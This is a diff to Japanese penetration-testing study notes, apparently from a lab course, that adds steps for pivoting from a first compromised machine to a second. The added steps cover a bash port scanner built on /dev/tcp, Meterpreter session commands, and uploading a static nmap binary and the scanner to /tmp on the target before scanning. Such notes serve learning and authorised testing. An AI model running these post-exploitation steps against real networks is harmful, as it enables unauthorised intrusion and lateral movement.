@@ -76,7 +76,7 @@ quiz
 
 task Metasploitを使用して、1番目に脆弱性のあるマシンを利用してそこに接続されているマシンのポートスキャンを行う
 
-task
+task　1番目のターゲットから2番目のターゲットに侵入する
 1) ターミナルを起動
 2) ping -c 4 ターゲットドメイン
 3) nmap ターゲットドメイン
@@ -104,9 +104,27 @@ set port 1-1000
 exploit
 11) 「/usr/bin/」ディレクトリで使用可能な静的バイナリの確認
 ls -al /root/static-binaries/nmap
-file /root/static/binaries/nmap
+file /root/static-binaries/nmap
+12) metasplotをバックグラウンドで実行して、bashポートスキャンスクリプトを作る。
+[#!/bin/bash
+for port in {1..1000}; do
+ timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+done]
+→bash-port-scanner.sh
+13) metasploitをfgでフォアグラウンドにする。
+sessions -i 1
+14) nmap静的バイナリとbashスキャンスクリプトをターゲットマシンにアップロードする。
+upload /root/static-binaries/nmap /tmp/nmap
+upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+15) bashスクリプト実行可能にする。
+shell
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh 
+./bash-port-scanner.sh ターゲットドメイン
+16) ポートスキャンを実行
+./nmap -p- targetIP
 
-12) 
+
 
 
 FTP列挙
